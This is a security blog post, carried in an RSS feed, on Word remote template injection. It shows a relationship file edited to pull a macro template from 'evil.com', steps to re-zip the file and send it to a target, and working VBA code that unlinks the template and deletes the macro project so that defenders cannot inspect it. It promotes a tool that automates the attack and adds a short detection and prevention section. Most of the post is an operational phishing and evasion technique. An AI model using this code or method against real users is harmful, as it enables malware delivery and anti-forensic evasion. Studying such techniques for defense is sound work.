  &lt;p&gt;&amp;lt;Relationships xmlns=”http://schemas.openxmlformats.org/package/2006/relationships”&amp;gt;&amp;lt;Relationship Id=”rId1” Type=”http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate” Target=”file:////Users/johnwoodman/Library/Containers/com.microsoft.Word/Data/Library/Application%20Support/Microsoft/Office/16.0/DTS/en-US%7b95D41D06–9CC6-D74F-A607–2B7C0EB22DFC%7d/%7b33B4F4BC-0742–3849-AA14-CD5092D5B844%7dtf10002086.dotx” TargetMode=”External”/&amp;gt;&amp;lt;/Relationships&amp;gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The part to pay attention to is the “Target” attribute. At the moment, this attribute is pointing to a file on the local machine. What we are able to do is change the value so it points to a remote file, which will then be used as the template for that document. This template would contain the macros you want to be executed. You can specify either an HTTP(S) URL or a SMB address pointing to your template.&lt;/p&gt;

&lt;p&gt;Below shows the contents of settings.xml.rels after it has been altered to point to a malicious web server containing a malicious word template:&lt;/p&gt;
&lt;blockquote&gt;
  &lt;?xml version=”1.0&quot; encoding=”UTF-8&quot; standalone=”yes”?&gt;
  &lt;p&gt;&amp;lt;Relationships xmlns=”http://schemas.openxmlformats.org/package/2006/relationships”&amp;gt;&amp;lt;Relationship Id=”rId1” Type=”http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate” Target=”https://evil.com/malicious.dotm” TargetMode=”External”/&amp;gt;&amp;lt;/Relationships&amp;gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Once edited, all you have to do is re-zip the XML files and rename the extension to .docx. All that is left to do is send malicious doc to your “target” and once opened (and content is enabled) the template is pulled from the malicious web server and the macro code inside it is executed.&lt;/p&gt;

&lt;p&gt;I created a &lt;a href=&quot;https://github.com/JohnWoodman/remoteinjector&quot;&gt;tool&lt;/a&gt; that automates all this for you!&lt;/p&gt;

&lt;h2 id=&quot;unlinking--self-deletion&quot;&gt;&lt;a href=&quot;#header-2&quot;&gt;&lt;/a&gt;Unlinking &amp;amp; Self-Deletion&lt;/h2&gt;

&lt;p&gt;While Remote Template Injection can be very useful in evading anti-virus, once the template is run, the VBA code will remain in the document. This means if blue team gets ahold of the document, they can see all the malicious code that was executed.&lt;/p&gt;

&lt;p&gt;The technique I found to get around this is by unlinking the template using VBA. The below snippet of VBA code shows how the unlinking is done, as well as how to prevent dialog boxes from popping up to the target user asking them to “Save Changes”.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Sub unlink()
    Application.DisplayAlerts = False
    On Error GoTo Destroy
    ThisDocument.AttachedTemplate.Saved = True
    CurrUser = Application.UserName
    tmpLoc = &quot;C:\Users\&quot; &amp;amp; CurrUser &amp;amp; &quot;\AppData\Roaming\Microsoft\Templates\Normal.dotm&quot;
    ActiveDocument.AttachedTemplate = tmpLoc
    ActiveDocument.AttachedTemplate.Saved = True
    ThisDocument.Saved = True
    ActiveDocument.Saved = True
    ThisDocument.Close savechanges:=False
Exit Sub
Destroy:
    Call ThisDocument.DeleteVBAPROJECT
    ThisDocument.Saved = True
    ActiveDocument.Saved = True
    ActiveDocument.AttachedTemplate.Saved = True
    ThisDocument.Close savechanges:=False
End Sub
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Essentially, to unlink the current template you have to link the document to another template. In the above code, I am linking it to Normal.dotm, the default template found in every computer with Word installed.&lt;/p&gt;

&lt;p&gt;The code in the “Destroy” section of the code is the self-deletion, essentially a fail-safe. If an error occurs in the unlinking process (either through Normal.dotm not existing, or another error that I will discuss below), then the function “DeleteVBAPROJECT” is called. This function deletes all the code in the template. Below is a snippet of that function’s code:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Sub DeleteVBAPROJECT()
    Application.DisplayAlerts = False
    Dim i As Long
    On Error Resume Next
    With ThisDocument.VBProject
        For i = .VBComponents.Count To 1 Step -1
            .VBComponents.Remove .VBComponents(i)
            .VBComponents(i).CodeModule.DeleteLines _
            1, .VBComponents(i).CodeModule.CountOfLines
        Next i
    End With
    On Error GoTo 0
    ThisDocument.Saved = True
    ActiveDocument.Saved = True
End Sub
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This function serves only as a last-ditch effort if the unlinking method errors out.&lt;/p&gt;

&lt;p&gt;To show that the Macro VBA code can not be viewed (at least not easily), the below image shows the VBA Editor of the malicious document before the macro has been run:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2018-01-06-VBA-Macro-Remote-Template-Injection/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can see that the template “DocTemp” has been loaded into the document, but the VBA code itself has not. Even before the macro code is run, it is not view-able.&lt;/p&gt;

&lt;p&gt;The following image shows the VBA Editor after the content has been enabled (note: in this scenario, the VBA Editor has not been opened prior to enabling content, the reason that is important is explained later):&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2018-01-06-VBA-Macro-Remote-Template-Injection/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;You can see the macro code from the template has been executed (popping calc.exe) and the template has successfully unlinked itself from the word document, no longer appearing in the VBA Editor.&lt;/p&gt;

&lt;p&gt;As I referenced earlier, one of the errors that continued to happen with the unlink method occurred whenever I would open the malicious document, and then open and close the VBA Editor window. I am still unsure as to why simply opening the VBA Editor causes the unlink method to fail, but the self-deletion method is currently the best temporary solution, as it still gets rid of all lines of code that could be viewed by potential blue team.&lt;/p&gt;

&lt;p&gt;The below image shows what remains if the VBA Editor is opened prior to enabling content:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/2018-01-06-VBA-Macro-Remote-Template-Injection/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, the reference to DocTemp remains, however, all the VBA code has been deleted.&lt;/p&gt;

&lt;h2 id=&quot;detectionprevention&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Detection/Prevention&lt;/h2&gt;

&lt;p&gt;This method isn’t perfect. While I haven’t found anyway to view the actual Macro VBA code from the target side (both before and after enabling content), there are still ways to view the function names as well as the source URL that the template is being retrieved from. To view the function names:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Open the malicious document, but do not enable content.&lt;/li&gt;
  &lt;li&gt;Select the “Macros” button in the Developer tab.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This will give you the function names, but only the names. You will not be able to edit or step into these functions as they technically have not been loaded yet.&lt;/p&gt;

&lt;p&gt;To view the source URL of the template:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Open the malicious document, but do not enable content.&lt;/li&gt;
  &lt;li&gt;Select the “Document Template” button in the Developer tab.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;This will display the URL that the malicious document is grabbing the template from, allowing you to potentially retrieve the template from that URL yourself and be able to fully analyze the macro VBA code.&lt;/p&gt;

&lt;p&gt;In terms of prevention, disabling the ability for Word/Excel documents to retrieve templates remotely would be the most effective against this type of attack.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;I made this post mostly to help me learn and better understand the security and inner workings behind Macros, but I hope it also gives insight into one of numerous techniques to evade anti-virus and static analysis, and also how to detect and prevent against it.&lt;/p&gt;

&lt;h2 id=&quot;references&quot;&gt;&lt;a href=&quot;#header-5&quot;&gt;&lt;/a&gt;References&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html&quot;&gt;Executing Macros From a DOCX With Remote Template Injection by BinaryFaultline&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
        <pubDate>Thu, 28 Nov 2019 00:00:00 +0000</pubDate>
        <link>//posts/VBA-Macro-Remote-Template-Injection/</link>
        <link href="/posts/VBA-Macro-Remote-Template-Injection/"/>
        <guid isPermaLink="true">/posts/VBA-Macro-Remote-Template-Injection/</guid>
      </item>
    
  </channel>
</rss>
